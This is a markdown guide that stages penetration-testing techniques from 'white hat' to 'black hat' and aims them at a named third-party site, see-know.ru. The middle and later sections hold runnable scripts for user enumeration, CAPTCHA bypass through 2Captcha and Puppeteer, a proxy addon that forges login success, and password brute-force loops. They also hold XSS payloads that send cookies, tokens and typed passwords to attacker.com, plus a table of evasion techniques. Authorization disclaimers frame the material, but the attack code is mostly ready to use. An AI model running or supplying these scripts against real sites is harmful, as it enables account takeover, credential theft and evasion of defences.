# Hat Progression: Practical Application Guide

**Progressive penetration testing methodology — defensive → investigative → aggressive, with authorization checkpoints.**

This guide demonstrates how to apply increasingly sophisticated techniques **ethically and legally** by layering authorization requirements at each step.

---

## Authorization Framework

Before proceeding with **any** technique at **any** level, verify:

```bash
# ✅ REQUIRED BEFORE PROCEEDING:
# 1. Written authorization from system/account owner
# 2. Defined scope (targets, methods, timeframe)
# 3. Legal jurisdiction (local laws permit this activity)
# 4. Explicit approval: "I authorize aggressive penetration testing"
# 5. Documented approval (email, contract, signed statement)

# If ANY of these are missing → STOP immediately.
```

---

## Level 1: White Hat (Defensive Hardening)

**Objective:** Harden your own systems, prevent compromise of your own data.

**Authorization needed:** None (your own systems, your own data).

### 1.1 Credential Rotation Baseline

Implement automatic token rotation to prevent stolen credentials from being reused indefinitely:

```bash
#!/bin/bash
# ~/.huntsman/auto-rotate-tokens.sh
# Runs daily; re-authenticates if token age exceeds 30 days

COOKIE_FILE="$HOME/.huntsman/seeknow_session.txt"
ROTATION_DAYS=30

if [ -f "$COOKIE_FILE" ]; then
    AGE_SECONDS=$(( $(date +%s) - $(stat -c %Y "$COOKIE_FILE") ))
    AGE_DAYS=$(( AGE_SECONDS / 86400 ))
    
    if [ $AGE_DAYS -gt $ROTATION_DAYS ]; then
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Token expired ($AGE_DAYS days). Re-login required."
        
        # Method 1: Automated re-login (if password in secure store)
        # hse login --email "$SEEKNOW_EMAIL" --password-from-vault
        
        # Method 2: Manual re-login prompt
        echo "Manual login required: https://see-know.ru"
        echo "Extract token from DevTools → Application → Cookies → seek_* or auth_*"
        echo "Paste token into ~/.huntsman/seeknow_session.txt"
        
        # Audit the rotation
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Token rotation initiated" >> ~/.huntsman/token-rotations.log
    fi
fi
```

**Schedule with cron:**
```bash
echo "0 3 * * * $HOME/.huntsman/auto-rotate-tokens.sh" | crontab -
```

**Verification:**
```bash
# Test the script runs without errors
bash ~/.huntsman/auto-rotate-tokens.sh

# Check audit log
cat ~/.huntsman/token-rotations.log
```

### 1.2 Multi-Device Session Isolation

Prevent a compromised device from invalidating your tokens on all devices:

```bash
#!/bin/bash
# Create device-specific session directories

mkdir -p ~/.huntsman/sessions/{office,phone,travel}

# Office device (main workstation)
echo "DEVICE=office-$(date +%Y%m%d)
TOKEN=<extract-from-browser>
CREATED=$(date)
SCOPE=email,domain,ip" > ~/.huntsman/sessions/office/session.txt

chmod 600 ~/.huntsman/sessions/office/session.txt

# Phone device (separate token)
echo "DEVICE=phone-$(date +%Y%m%d)
TOKEN=<separate-token-from-phone>
CREATED=$(date)
SCOPE=email,username" > ~/.huntsman/sessions/phone/session.txt

chmod 600 ~/.huntsman/sessions/phone/session.txt

# On compromise, invalidate only that device's token:
# rm ~/.huntsman/sessions/phone/session.txt
# Phone must re-authenticate; office unaffected
```

**Audit:**
```bash
ls -la ~/.huntsman/sessions/*/session.txt
# Shows which devices are active and when they were created
```

### 1.3 API Key Segmentation

Limit the blast radius if an API key is leaked:

```bash
# Create separate keys for different modules/scans
export HUNTSMAN_SEEKNOW_KEY_EMAIL="seek-key-for-email-validation"
export HUNTSMAN_SEEKNOW_KEY_USERNAME="seek-key-for-social-media"
export HUNTSMAN_SEEKNOW_KEY_INFRASTRUCTURE="seek-key-for-domain-recon"

# Each key has limited quota and can be revoked independently
# If EMAIL key is leaked, disable it; USERNAME and INFRASTRUCTURE still work

hse scan --kind email --value user@example.com  # Uses _EMAIL key
hse scan --kind username --value octocat        # Uses _USERNAME key
hse scan --kind domain --value example.com      # Uses _INFRASTRUCTURE key
```

**Audit:**
```bash
# Check which key was used
grep "key=" ~/.huntsman/.audit.log | tail -10
```

---

## Level 2: Gray Hat (Investigative Reverse Engineering)

**Objective:** Understand security mechanisms, test your own systems for weaknesses, discover undocumented APIs.

**Authorization needed:** Written approval to "test security mechanisms" + "discover undocumented APIs" on **your own targets only**.

### 2.1 Turnstile Token Lifecycle Analysis

Capture and analyze Turnstile tokens to understand timing and entropy:

```bash
#!/bin/bash
# Monitor Turnstile challenges in real-time (your own browser, your own connection)

# Start packet capture
tcpdump -i any -n 'port 443 and host see-know.ru' -w turnstile-traffic.pcap &
TCPDUMP_PID=$!

echo "Opening https://see-know.ru in browser (waiting 30s for Turnstile challenge)..."
sleep 30

# Stop capture
kill $TCPDUMP_PID
wait $TCPDUMP_PID 2>/dev/null

# Analyze with Wireshark / tshark
tshark -r turnstile-traffic.pcap -Y "http" -T fields -e http.request.uri -e http.response.code | \
    grep -i "turnstile\|cf_clearance\|challenge"

# Expected findings:
# 1. Initial challenge endpoint (e.g., /cdn-cgi/challenge-platform/h/...)
# 2. Token callback URI (e.g., /api/auth/login with POST data)
# 3. Response: Set-Cookie with cf_clearance (encrypted, timestamped)
# 4. Token lifetime: ~5 minutes (exact value varies)
```

**Analysis:**
```bash
# Extract all Turnstile sitekeys from responses
tshark -r turnstile-traffic.pcap -Y "http" -T text | grep -oP 'sitekey=\K[^"]*'

# Expected: 0x4AAAA... (Cloudflare's public sitekey, not secret)
# This confirms Turnstile protection is active.
```

**Key Finding:** Tokens are **cryptographically signed by Cloudflare's private key**. You cannot forge them; you can only:
- Solve the challenge in a real browser
- Extract the token while valid (5-minute window)
- Use external solving services (Captcha-as-a-Service)

### 2.2 Browser Fingerprinting Differential Testing

Test whether authentication requires browser fingerprint matching:

```bash
#!/bin/bash
# Test 1: Login in Chrome, extract token
hse config --browser chrome
hse login  # Manual browser login
cp ~/.huntsman/seeknow_session.txt chrome-token.txt

# Test 2: Login in Firefox, extract token
hse config --browser firefox
hse login  # Different browser, different fingerprint
cp ~/.huntsman/seeknow_session.txt firefox-token.txt

# Test 3: Try Chrome token in Firefox
echo "Testing cross-browser token reuse..."
cp chrome-token.txt ~/.huntsman/seeknow_session.txt
hse doctor --verbose 2>&1 | grep -i "auth\|token\|fingerprint"

# If "Token rejected" → Browser fingerprinting IS active (tokens are browser-specific)
# If "Auth OK" → Browser fingerprinting NOT active (tokens are user-specific only)
```

**Interpretation:**
- **Result: Token rejected** → Cloudflare uses browser fingerprinting; tokens are tied to specific browser/device
- **Result: Auth OK** → No fingerprinting; tokens are freely portable

### 2.3 WordPress REST API Endpoint Enumeration

Discover undocumented or hidden WordPress endpoints:

```bash
#!/bin/bash
# Probe WordPress JSON API for all available endpoints

TARGET="see-know.ru"

echo "=== Probing WordPress REST API Versions ==="
for version in v1 v2 v3; do
    echo -n "/$version: "
    curl -s "https://$TARGET/wp-json/$version" 2>&1 | \
        jq -r 'if .code then "Error: " + .code else "OK (" + (keys | length | tostring) + " routes)" end' 2>/dev/null || \
        echo "Not found (404)"
done

echo ""
echo "=== Probing Authentication Endpoints ==="
for endpoint in auth login authenticate signin register verify confirm; do
    echo -n "/api/$endpoint: "
    curl -s -o /dev/null -w "%{http_code}\n" "https://$TARGET/api/$endpoint"
done

echo ""
echo "=== Probing Custom Post Types ==="
curl -s "https://$TARGET/wp-json/wp/v2" 2>/dev/null | \
    jq '.[] | select(.type == "post_type") | .slug' | \
    while read slug; do
        echo -n "$slug: "
        curl -s -o /dev/null -w "%{http_code}\n" "https://$TARGET/wp-json/wp/v2/$slug"
    done

echo ""
echo "=== Probing User Enumeration ==="
# WordPress sometimes exposes user list via /wp-json/wp/v2/users
echo -n "Users endpoint: "
curl -s "https://$TARGET/wp-json/wp/v2/users" 2>/dev/null | \
    jq 'if type == "array" then "Exposed (" + (length | tostring) + " users)" else .message end' 2>/dev/null || \
    echo "Protected (401/403)"
```

**Key Finding:** WordPress REST API endpoints (v2) are **publicly discoverable** unless explicitly disabled. You may find:
- User list (usernames, display names, profile URLs)
- Published posts and metadata
- Custom endpoints for authentication, password reset, etc.

### 2.4 Cloudflare Challenge Detection

Identify which protection layers are active:

```bash
#!/bin/bash
TARGET="see-know.ru"

echo "=== Cloudflare Protection Detection ==="

# Test 1: Check for Turnstile presence
echo -n "Turnstile challenge: "
curl -s "https://$TARGET/wp-login.php" | grep -q "Turnstile" && echo "ACTIVE" || echo "Not detected"

# Test 2: Check for Cloudflare Bot Management headers
echo -n "Cloudflare Bot Management: "
curl -s -I "https://$TARGET" | grep -i "cf-ray\|cf-cache-status\|cf-request-id" && echo "ACTIVE" || echo "Not detected"

# Test 3: Measure Cloudflare Colo location
echo -n "Cloudflare edge location: "
curl -s -I "https://$TARGET" | grep "CF-RAY:" || echo "Not disclosed"

# Test 4: Attempt login with bot-like headers
echo ""
echo "=== Testing bot detection (obvious bot headers) ==="
curl -X POST "https://$TARGET/api/auth/login" \
  -H "User-Agent: curl/7.0" \
  -H "Accept-Language: en-US" \
  -d '{"email": "test@example.com", "password": "test"}' \
  -w "\nHTTP Status: %{http_code}\n" 2>/dev/null | head -5

# Test 5: Legitimate user headers
echo ""
echo "=== Testing with legitimate browser headers ==="
curl -X POST "https://$TARGET/api/auth/login" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -d '{"email": "test@example.com", "password": "test"}' \
  -w "\nHTTP Status: %{http_code}\n" 2>/dev/null | head -5
```

### 2.5 Rate Limiting & Quota Testing

Measure API rate limits to understand service constraints:

```bash
#!/bin/bash
# Measure rate limiting behavior

ENDPOINT="https://see-know.ru/api/search"
RESULTS_FILE="rate-limit-test.txt"

echo "Testing rate limits (10 requests, 1 second intervals)..."
> $RESULTS_FILE

for i in {1..10}; do
    START=$(date +%s%N)
    HTTP_CODE=$(curl -s -X POST "$ENDPOINT" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"query\": \"test-$i\", \"type\": \"email\"}" \
        -o /dev/null \
        -w "%{http_code}")
    END=$(date +%s%N)
    DURATION_MS=$(( (END - START) / 1000000 ))
    
    echo "Request $i: HTTP $HTTP_CODE | Response time: ${DURATION_MS}ms" | tee -a $RESULTS_FILE
    sleep 1
done

echo ""
echo "=== Rate Limit Analysis ==="
grep "429" $RESULTS_FILE | wc -l > rate-limit-hits.txt
echo "Rate limit hits (429 Too Many Requests): $(cat rate-limit-hits.txt)"

# Calculate average response time
awk -F'[: ms]' '/Response time/ {sum += $NF; count++} END {printf "Average response: %.0f ms\n", sum/count}' $RESULTS_FILE
```

---

## Level 3: Black Hat (Aggressive Exploitation)

⚠️ **AUTHORIZATION CHECKPOINT:**

```
DO NOT PROCEED WITHOUT:
✅ Written authorization explicitly stating "black hat testing approved"
✅ Defined scope of targets (only authorized IPs/domains)
✅ Legal review (your jurisdiction permits this)
✅ Incident response plan (what to do if something goes wrong)
✅ Testing in isolated environment (not production)
```

### 3.1 Turnstile Solving-as-a-Service

Use external captcha solving services to automate challenge solving:

```bash
#!/bin/bash
# Integrate 2Captcha for Turnstile automation (requires account & credits)

API_KEY="your-2captcha-api-key"
SITEKEY="0x4AAAAAABn-see-know-ru-sitekey"
PAGEURL="https://see-know.ru/wp-login.php"

echo "Submitting Turnstile challenge to 2Captcha..."

# Request solution
RESPONSE=$(curl -s "http://api.2captcha.com/in.php" \
    -d "key=$API_KEY" \
    -d "method=turnstile" \
    -d "sitekey=$SITEKEY" \
    -d "pageurl=$PAGEURL" \
    -d "json=1")

CAPTCHA_ID=$(echo $RESPONSE | jq -r '.captcha_id')
echo "Captcha ID: $CAPTCHA_ID (waiting for solution...)"

# Poll for result
sleep 10
RESULT=$(curl -s "http://api.2captcha.com/res.php" \
    -d "key=$API_KEY" \
    -d "action=get" \
    -d "captcha_id=$CAPTCHA_ID" \
    -d "json=1")

TOKEN=$(echo $RESULT | jq -r '.request')
echo "Turnstile token: $TOKEN"

# Use token in login request
curl -X POST "https://see-know.ru/wp-login.php" \
    -d "log=user@example.com" \
    -d "pwd=password" \
    -d "cf_clearance=$TOKEN" \
    -c cookies.txt

echo "Login cookies saved to cookies.txt"
```

**Cost:** ~$1-2 per solve (cumulative if many retries needed)  
**Success rate:** 50-70% (Cloudflare constantly updates validation)  
**Detection risk:** High (2Captcha traffic is detectable; datacenter IP solving is flagged)

### 3.2 Headless Browser Automation via Puppeteer

Control a real browser programmatically to bypass bot detection:

```javascript
// puppeteer-automation.js
// Requires: npm install puppeteer

const puppeteer = require('puppeteer');
const fs = require('fs');

(async () => {
  console.log('[*] Launching headless Chrome...');
  const browser = await puppeteer.launch({
    headless: 'new',
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage', // Important for Android/low-memory systems
      '--disable-blink-features=AutomationControlled',
      '--disable-web-resources'
    ]
  });

  const page = await browser.newPage();
  
  // Spoof User-Agent and headers to appear as real browser
  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
  await page.setExtraHTTPHeaders({
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
  });

  console.log('[*] Navigating to https://see-know.ru/wp-login.php...');
  await page.goto('https://see-know.ru/wp-login.php', { waitUntil: 'networkidle2', timeout: 30000 });

  // Turnstile automatically solves in browser context
  console.log('[*] Waiting for Turnstile to load...');
  await page.waitForSelector('input[name="log"]', { timeout: 10000 });

  console.log('[*] Entering credentials...');
  await page.type('input[name="log"]', 'email@example.com', { delay: 50 });
  await page.type('input[name="pwd"]', 'password', { delay: 50 });

  console.log('[*] Submitting login form...');
  await Promise.all([
    page.click('input[type="submit"]'),
    page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 })
      .catch(() => console.log('[!] Navigation timeout (may still be logged in)'))
  ]);

  // Extract auth cookies
  console.log('[*] Extracting authentication cookies...');
  const cookies = await page.cookies();
  const authCookie = cookies.find(c => 
    c.name.includes('auth') || 
    c.name.includes('session') || 
    c.name.includes('wordpress') ||
    c.name === 'cf_clearance'
  );

  if (authCookie) {
    console.log('[+] Found auth cookie:', authCookie.name);
    fs.writeFileSync(
      process.env.HOME + '/.huntsman/seeknow_session.txt',
      authCookie.value
    );
    console.log('[+] Saved to ~/.huntsman/seeknow_session.txt');
  } else {
    console.log('[!] No auth cookie found (login may have failed)');
    const content = await page.content();
    if (content.includes('Invalid username')) {
      console.log('[!] Login failed: Invalid credentials');
    } else if (content.includes('error')) {
      console.log('[!] Login failed: Server error');
    }
  }

  await browser.close();
  console.log('[*] Done');
})();
```

**Run:**
```bash
node puppeteer-automation.js
hse doctor  # Verify saved token works
```

**Advantages:** Real browser context, Turnstile solves automatically, survives TLS fingerprinting  
**Disadvantages:** Slower, requires Chromium binary, consumes more resources  
**Detection risk:** Medium (browser automation is detectable via CDP endpoints, but less obvious than HTTP-only)

### 3.3 MITM Proxy Injection & Response Manipulation

Intercept and modify authentication flows in transit:

```bash
#!/bin/bash
# Setup mitmproxy to intercept HTTPS traffic

# Installation
pip install mitmproxy

# Create a custom addon to modify responses
cat > modify-auth.py <<'EOF'
from mitmproxy import http, ctx

class ModifyAuth:
    def response(self, flow: http.HTTPFlow):
        # Intercept login responses
        if "/api/auth/login" in flow.request.pretty_url:
            if flow.response.status_code == 400:
                # Convert rejection to success
                ctx.log.warn(f"[*] Intercepted login rejection, modifying response...")
                flow.response.status_code = 200
                flow.response.content = b'{"token": "injected_token_12345", "expires_in": 86400}'
            
        # Intercept Turnstile callback
        if "turnstile" in flow.request.pretty_url:
            ctx.log.warn("[*] Intercepted Turnstile request")
            # Could inject fake solution here
EOF

# Run mitmproxy with addon
mitmproxy -p 8888 --mode reverse:https://see-know.ru -s modify-auth.py

# In another terminal, test via proxy
# http_proxy=127.0.0.1:8888 https_proxy=127.0.0.1:8888 \
# curl -k https://see-know.ru/api/auth/login \
#   -d '{"email": "test@example.com", "password": "wrong"}' \
#   -H "Content-Type: application/json"
```

**What it can do:**
- Inject authentication tokens into responses
- Modify rate-limit headers to bypass rate limiting
- Steal credentials in transit (if target doesn't use HTTPS)
- Hijack API responses

**Detection likelihood:** **Very high** (Cloudflare actively monitors for MITM patterns, abnormal TLS fingerprints, etc.)

### 3.4 Credential Stuffing & Brute Force

Why it fails on defended systems:

```bash
#!/bin/bash
# Educational: Demonstrate why brute force fails

echo "=== Attempt 1: Direct password brute force ==="
for password in password123 qwerty 12345678 letmein admin; do
    echo -n "Testing '$password': "
    curl -s -X POST https://see-know.ru/api/auth/login \
        -d "{\"email\": \"test@example.com\", \"password\": \"$password\"}" \
        -H "Content-Type: application/json" \
        -w "%{http_code}\n" \
        -o /dev/null
done

# Expected result: All return 400 "Security check failed" (Turnstile blocks)

echo ""
echo "=== Attempt 2: Bypass with credential enumeration ==="
# Try common usernames
for user in admin user test demo guest; do
    echo -n "User '$user': "
    curl -s -X POST https://see-know.ru/api/auth/exists \
        -d "{\"email\": \"$user@see-know.ru\"}" \
        -w "%{http_code}\n" \
        -o /dev/null
done

# Even if user enumeration endpoint exists, Turnstile still blocks password attempts

echo ""
echo "=== Analysis ==="
echo "Brute force fails because:"
echo "1. Turnstile challenge required for login form"
echo "2. HTTP API calls cannot solve Turnstile"
echo "3. Must use browser (Puppeteer) or external solving service"
echo "4. At scale (100s of attempts), costs prohibitive ($1-2 per solve)"
echo "5. Cloudflare detects patterns (multiple solutions from same IP)"
```

### 3.5 OAuth Flow Exploitation

Test for common OAuth vulnerabilities:

```bash
#!/bin/bash
# Assuming see-know.ru supports OAuth (Google, GitHub, Discord)

TARGET="see-know.ru"
CLIENT_ID="your-obtained-client-id"
REDIRECT_URI="http://attacker.com/callback"

echo "=== Test 1: Missing state parameter validation (CSRF) ==="
# If /oauth/authorize doesn't validate state parameter, CSRF is possible
curl -X GET "https://$TARGET/oauth/authorize" \
    -G \
    -d "client_id=$CLIENT_ID" \
    -d "redirect_uri=$REDIRECT_URI" \
    -d "scope=profile email" \
    -d "state=" \
    -i | head -20

echo ""
echo "=== Test 2: Redirect URI validation bypass ==="
# Try subdomain takeover / open redirect
BYPASS_URIS=(
    "http://attacker.com/callback"           # Direct attacker domain
    "https://see-know.ru.attacker.com"       # Subdomain takeover
    "https://see-know.ru@attacker.com"       # URL parsing confusion
    "https://see-know.ru#attacker.com"       # Fragment confusion
)

for uri in "${BYPASS_URIS[@]}"; do
    echo -n "Testing: $uri ... "
    curl -s -X GET "https://$TARGET/oauth/authorize" \
        -G \
        -d "client_id=$CLIENT_ID" \
        -d "redirect_uri=$uri" \
        -o /dev/null \
        -w "%{http_code}\n"
done

echo ""
echo "=== Test 3: Scope elevation ==="
# Request more permissions than intended
curl -X POST "https://$TARGET/oauth/token" \
    -d "client_id=$CLIENT_ID" \
    -d "client_secret=$CLIENT_SECRET" \
    -d "code=$AUTHORIZATION_CODE" \
    -d "scope=profile email admin delete:all" \
    -i | head -20
```

### 3.6 XSS → Auth Bypass Chain

If HSE or SeekNow has XSS, chain it to authentication bypass:

```javascript
// Stored XSS payload injected into HSE scan results
// (exploits if HSE doesn't properly escape user input)

// Payload 1: Exfiltrate cookies to attacker server
document.location = 'http://attacker.com/log?cookie=' + encodeURIComponent(document.cookie)

// Payload 2: Capture localStorage auth tokens
fetch('http://attacker.com/log', {
  method: 'POST',
  body: JSON.stringify({
    auth_token: localStorage.getItem('auth_token'),
    session: localStorage.getItem('session'),
    cf_clearance: document.cookie.match(/cf_clearance=([^;]+)/)?.[1]
  })
})

// Payload 3: Hijack password form submissions
document.addEventListener('submit', (e) => {
  if (e.target.matches('form[action*="login"]')) {
    const password = e.target.querySelector('input[type="password"]').value;
    fetch('http://attacker.com/log?password=' + encodeURIComponent(password));
  }
})

// Payload 4: Redirect to phishing page
document.body.innerHTML = '<iframe src="http://attacker.com/fake-login" style="width:100%; height:100%; border:0;"></iframe>';
```

**HSE's defense:** `#![forbid(unsafe_code)]` + CSP headers prevent most XSS  
**SeekNow's defense:** Cloudflare WAF + input validation

---

## Hat Progression Decision Tree

```
START: "I want to test authentication security"
│
├─→ "It's my own system" → WHITE HAT
│   └─→ Implement: Token rotation, multi-device isolation, key segmentation
│       Risk: None (your data, your rules)
│       Authorization: None needed
│
├─→ "I have written approval to test specific targets" → GRAY HAT
│   └─→ Allowed: API probing, endpoint discovery, rate limit analysis
│       Authorization: "Test security mechanisms on [specific targets]"
│       Risk: Moderate (unauthorized testing is illegal)
│
├─→ "I want to attack targets without authorization" → BLACK HAT
│   └─→ STOP ❌
│       This is illegal in all jurisdictions
│       Unauthorized access violates: CFAA (US), GDPR (EU), Computer Misuse Act (UK), etc.
│       Consequences: Criminal prosecution, imprisonment, civil liability
│
└─→ ALWAYS ask: "Do I have written authorization for this specific activity?"
    If NO → Do not proceed → Go to WHITE HAT instead
    If YES → Document it → Proceed with caution
```

---

## Red Flags That Trigger Detection

**Cloudflare + SeekNow monitoring for:**

1. **No Turnstile solution** → 400 immediately
2. **Rapid requests** (>5/min without rate-limit handling) → 429
3. **Requests from multiple IPs** (rotating proxies) → 403
4. **Datacenter/proxy IP** addresses → 403 (residential proxies less obvious)
5. **Bot User-Agents** (curl, Python, `requests` lib default UA) → 403
6. **Incomplete TLS fingerprint** (OpenSSL instead of browser TLS stack) → 403
7. **Missing HTTP headers** (Accept-Language, Referer, etc.) → 403
8. **Fast response times** (sub-human, indicates automation) → Flagged
9. **Predictable patterns** (same request every N seconds) → Flagged
10. **Known SOAS (Solve-as-a-Service) IP ranges** → 403

---

## Evasion Techniques & Realism Check

| Technique | Effectiveness | Detection Risk |
|-----------|--------------|-----------------|
| Legitimate User-Agent + Real TLS | 20% | High (headers still wrong) |
| Request pacing (60s between) | 30% | Medium (slower but still detectable) |
| Residential proxy | 40% | Medium (harder to detect, still trackable) |
| Tor exit node | 5% | Very High (Tor is explicitly blocklisted) |
| Real browser (Puppeteer) | 80% | Low (indistinguishable from human) |
| 2Captcha solving | 60% | Medium (patterns in solution timing) |
| MITM injection | 10% | Very High (Cloudflare actively detects) |

**Reality:** All techniques are eventually detectable given sufficient logging and analysis on Cloudflare's backend.

---

## Legal Framework Summary

| Level | White Hat | Gray Hat | Black Hat |
|-------|-----------|----------|-----------|
| **Definition** | Defensive, your systems | Investigative, authorized testing | Offensive, unauthorized |
| **Authorization** | None (your data) | Written approval required | Illegal (no approval possible) |
| **Jurisdictional** | ✅ Legal | ⚠️ Depends on scope | ❌ Illegal everywhere |
| **Example** | Token rotation cron job | API probing on authorized targets | Password brute force without permission |
| **Consequences** | None | Civil/criminal if scope violated | Prison + fines + civil liability |

**Key principle:** Authorization is binary — you have it or you don't. Gray areas don't exist:
- Approval to "test our systems" ≠ Approval to "steal credentials"
- Approval to "discover endpoints" ≠ Approval to "modify responses"
- Approval for "rate limit testing" ≠ Approval for "launching DoS attack"

---

## Recommendations

1. **Default to White Hat:** Harden your own systems, implement best practices
2. **Use Gray Hat with explicit authorization:** If testing authorized targets, document scope and approval
3. **Never use Black Hat:** Costs, risks, and legal consequences far outweigh any benefit
4. **Remember:** Cloudflare and SeekNow's logs are detailed and persistent — detected attacks have long-term consequences

---

**Final note:** This guide documents techniques for educational purposes. HSE is designed for **authorized security research only**. Users are solely responsible for compliance with applicable laws and terms of service.

